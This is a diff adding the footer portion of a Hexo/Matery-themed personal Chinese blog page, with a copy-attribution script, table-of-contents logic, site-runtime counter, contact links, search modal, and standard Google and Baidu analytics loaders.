+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('100')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 简言之<br />'
+            + '文章作者: 简简<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('2'),
+            headingSelector: 'h1, h2, h3, h4, h5, h6'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4, h5, h6').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://jwt1399.top" target="_blank">简简</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>&nbsp;|
+
+			<!-- <span>为♥️️发电</span> -->
+            <a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"><img no-lazy src="https://img.jwt1399.top/img/20200824181422.png" style="width: 47px; vertical-align: middle;" ></a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">1077.5k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "7";
+                    var startDate = "2";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            <a href="https://search.google.com/search-console?resource_id=http%3A%2F%2Fjwt1399.top%2F" target="_blank"
+                rel="nofollow noopener">谷歌统计</a>&nbsp;|
+            
+            <span id="icp"><img no-lazy src="/medias/icp.png" style="vertical-align: text-bottom;" />
+                <a href="http://www.beian.miit.gov.cn/" target="_blank">蜀ICP备19020450号</a>
+            </span>
+            |
+            
+            <a href="https://tongji.baidu.com/web/10000159136/overview/index?siteId=14519996" target="_blank"
+                rel="nofollow noopener">百度统计</a>
+
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+    <a href="https://jwt1399.top/baidusitemap.xml" class="tooltipped" target="_blank" data-tooltip="访问我的sitemap" data-position="top" data-delay="50">
+        <i class="fas fa-sitemap"></i>
+    </a>
+
+
+    <a href="https://pl.jwt1399.top" class="tooltipped" target="_blank" data-tooltip="valine评论: https://pl.jwt1399.top" data-position="top" data-delay="50">
+        <i class="fab fa-optin-monster"></i>
+    </a>
+
+
+    <a href="mailto:1019084218@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1019084218" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1019084218" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.json", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://cdn.staticfile.org/aos/3.0.0-beta.6/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+	<!--valine_人机验证-->
+	<button id="TencentCaptcha"data-appid="2046265119"data-cbfn="callback"type="button" hidden></button>
+	
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-160042502-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-160042502-1');
+</script>
+
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?0e306ce3426983ae6367d094d39f1190";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" color="0,0,255"
+        pointColor="0,0,255" opacity='0.7'
+        zIndex="-1" count="99"
+        src="/libs/background/canvas-nest.js"></script>
+    
+
+    
+    
+    <script type="text/javascript" size="150" alpha='0.6'
+        zIndex="-1" src="/libs/background/ribbon.min.js" async="async"></script>
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+        
+</body>
+
+</html>
